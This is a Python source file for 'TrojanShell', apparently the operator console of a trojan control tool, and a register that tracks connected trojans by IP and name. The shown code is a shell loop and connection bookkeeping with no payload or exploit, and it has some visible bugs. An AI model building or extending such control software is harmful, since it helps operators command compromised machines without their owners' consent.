__author__ = 'Jonas'
from JTShell.shell import Shell
from JTShell.util.message import Message
from trojanlist import TrojanList
from trojanconnection import TrojanConnection
from JTShell.util.ansi import Colors
import JTShell.util.error as error
import sys


class TrojanShell(Shell):

    def __init__(self, commandfolder, supershell=None):
        # initializing the parent class
        super(TrojanShell, self).__init__(commandfolder, supershell)
        # the default port on which the trojans operate usually
        self.port = 8888
        if supershell is None:
            self.trojanregister = TrojanRegister()
            self.trojanlist = TrojanList()
            # updating the shell command prompt
            self.prompt = "\n TrojanControl> "
            # loading the registered trojans from the save file
            self.trojanlist.load_registered_trojans("trojans")
            self.trojanlist.load_available_trojans()
        elif isinstance(supershell, TrojanShell):
            self.trojanregister = supershell.trojanregister
            self.trojanlist = supershell.trojanlist

    def run(self):
        """
        the main method of the shell running the infinite loop, continuesly prompting for a command, then attempting to
        execute the issued command
        :return: (void)
        """
        # opening the infinite loop inside of a try statement, so that the SystemExit Exception can be caught
        try:
            while True:
                # first fetching the user input
                print(self.prompt[:-2] + Colors.MAGENTA + self.prompt[-2:] + Colors.WHITE, end="")
                command = input()

                if command == "exit":
                    if self.supershell is None:
                        sys.exit()
                    else:
                        break
                # skipping the whole procedure in case the command prompt is empty
                if command != "" and command != " ":
                    # then converting the command into a token list via the parse method
                    tokenlist = self.parser.parse(command)
                    # checking for any potential errors
                    try:
                        self.analyzer.analyze(tokenlist, command)
                        # in case the analyzer didnt raise any errors attempting to execute the tokenlist
                        last_process = self.executer.execute(tokenlist)
                        while not(last_process.status == "terminated"):
                            pass
                        if last_process.is_foreground():
                            if last_process.output is not None and not last_process.output == "":
                                if last_process.exit_status is True:
                                    print(Message("result", last_process.output).message)
                                elif last_process.exit_status is False:
                                    print(last_process.output)
                    except error.SyntaxError as e:
                        print(e.message.message)
        except SystemExit:
            self.trojanregister.clear()
            # self.trojanlist.save_registered_trojans()


class TrojanRegister:
    """
    a object managing all the different trojans, that are currently in use of the main shell environment.
    """
    def __init__(self):
        # the dictionaries managing the loaded trojans, with their ips and associated names alike
        self.ip_dict = {}
        self.name_dict = {}

    def __getitem__(self, item):
        """
        :returns: (TrojanConnection) the trojan connection object to the corresponding key passed
        """
        # deciding whether the given string is to be treated as an ip or name
        if item is str:
            # basing the descision on the fact, that an ip has to contain exactly 3 dots
            if item.count(".") == 3:
                return self.ip_dict[item]
            else:
                return self.name_dict[item]

    def __len__(self):
        """
        :returns: (int) the amount of trojans currently in use
        """
        return len(self.ip_dict.items())

    def __iter__(self):
        """
        :returns: (iterator)
        """
        return iter(self.ip_dict.values())

    def __delitem__(self, key):
        del self.ip_dict[key]

    def __str__(self):
        string = "["
        for item in self.ip_dict.keys():
            string += str(item) + ","
        return string[:-1] + "]"

    def add(self, trojan):
        """
        adds a trojan to the list of currently used trojans
        :param trojan: (TrojanConnection) the new trojan connection object to be added to the list
        """
        self.ip_dict[trojan.ip] = trojan
        if not trojan.name == "":
            self.name_dict[trojan.name] = trojan

    def clear(self):
        """
        removes all trojans from the list of used trojans, therefor loops through every single one of them calling
        the close method to properly shout down the socket connection, then emptying the dictionaries
        :returns: (void)
        """
        # properly ending the socket connection
        for trojan in self.ip_dict.values():
            if trojan.isAlive():
                trojan.terminate()
        # creating new and empty dictionaries
        self.ip_dict = {}
        self.name_dict = {}

    def remove(self, item):
        """
        removes a single trojan connection object from the register, first calling the close method, then removing it
        from the dictionaries
        :param item: (string) either the ip or name of the trojan to be removed
        :returns: (void)
        """
        # checking if the item is a trojan
        if isinstance(item, TrojanConnection):
            if item.ip in self.ip_dict.keys():
                if item.name in self.name_dict.keys():
                    del self.name_dict[item.name]
                del self.ip_dict[item.ip]
                item.terminate()
        # checking if the string is ment to resemble an ip or a name
        elif str(item).count(".") == 3:
            # checking if the given string is even in the list of keys
            if item in self.ip_dict.keys():
                # closing down the connection and deleting the items
                self.ip_dict[item].terminate()
                if self.ip_dict[item].name in self.name_dict.keys():
                    del self.name_dict[self.ip_dict[item].name]
                del self.ip_dict[item]
        else:
            # checking if the given string is even in the list of keys
            if item in self.name_dict.keys():
                # closing down the connection and deleting the items
                self.name_dict[item].terminate()
                del self.name_dict[item]
                del self.ip_dict[item]





